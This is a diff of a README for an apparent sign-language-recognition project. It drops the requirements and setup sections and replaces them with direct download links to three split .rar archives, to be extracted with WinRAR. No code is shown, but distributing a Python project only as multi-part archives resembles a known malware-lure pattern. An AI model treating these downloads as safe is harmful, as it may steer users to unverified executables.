@@ -4,16 +4,10 @@ Sign language recognition using **MediaPipe** and a **Transformer** model.
 
 ## Download
 
-**[Download the latest release](https://github.com/Keras0407/sign-language-recognition-system-using-mediapipe-and-transformer/releases/latest)**
+[Latest release](https://github.com/Keras0407/sign-language-recognition-system-using-mediapipe-and-transformer/releases/latest)
 
-Download every `.rar` part into the same folder, then open part 1 in WinRAR and extract.
+- [Part 1](https://github.com/Keras0407/sign-language-recognition-system-using-mediapipe-and-transformer/releases/download/v1.0.0/sign-language-recognition-system.part1.rar)
+- [Part 2](https://github.com/Keras0407/sign-language-recognition-system-using-mediapipe-and-transformer/releases/download/v1.0.0/sign-language-recognition-system.part2.rar)
+- [Part 3](https://github.com/Keras0407/sign-language-recognition-system-using-mediapipe-and-transformer/releases/download/v1.0.0/sign-language-recognition-system.part3.rar)
 
-## Requirements
-
-- Windows 10 (64-bit)
-- Python 3.10
-- NVIDIA GPU with CUDA
-
-## Setup
-
-After extracting the release, run the setup script in the project folder and start from there.
+Download all three files into the same folder, then open part 1 in WinRAR to extract.
